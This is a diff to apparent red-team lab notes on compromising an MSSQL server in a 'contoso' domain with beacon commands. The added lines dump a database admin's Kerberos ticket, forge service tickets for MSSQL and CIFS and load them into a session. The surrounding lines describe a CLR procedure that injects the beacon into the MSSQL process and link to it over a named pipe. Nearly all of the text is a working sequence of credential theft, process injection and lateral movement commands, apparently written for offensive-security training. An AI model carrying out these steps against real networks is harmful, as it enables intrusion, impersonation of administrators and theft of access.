@@ -13,6 +13,13 @@ let's search for principals with sysadmin privs
 this shows us that rsteel is a database admin!
 let's impersonate rsteel and re enumerate
     steal token from rsteel
+        interact with SYSTEM
+            beacon> krb_triage
+            beacon> krb_dump /user:rsteel /service:krbtgt
+            beacon> krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[TGT]
+            now let's save that ticket in a kirbi file 
+            beacon> make_token CONTOSO\rsteel FakePass
+            beacon> kerberos_ticket_use C:\Users\Attacker\desktop\rsteel.kirbi
     beacon> sql-whoami lon-db-1
 
 now we have all admin privs!
@@ -181,13 +188,24 @@ paste the following code:
             STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
         }
     }
-the above codew will perform classic injection where the beacon will run inside MSSQL process 
+the above code will perform classic injection where the beacon will run inside MSSQL process 
 
 build the project and now load it 
     beacon> sql-clr lon-db-1 "C:\Payloads\MyProcedure\MyProcedure\bin\Release\MyProcedure.dll" MyProcedure
 
 now link to beacon
     beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+    NOTE: this name pipe comes from the smb listener config
+
+this may fail with error LOGON_FAILURE since it is an smb beacon and we need a cifs ticket to interact, we only have MSSQL 
+so let's get a ticket for cifs
+    beacon> krb_asktgs /service:cifs/lon-db-1 /ticket:[TGT]
+    save to cifs.kirbi
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
+
+now try to link to beacon
+    beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+    it works!
 
 now disable clr
     beacon> sql-disableclr lon-db-1
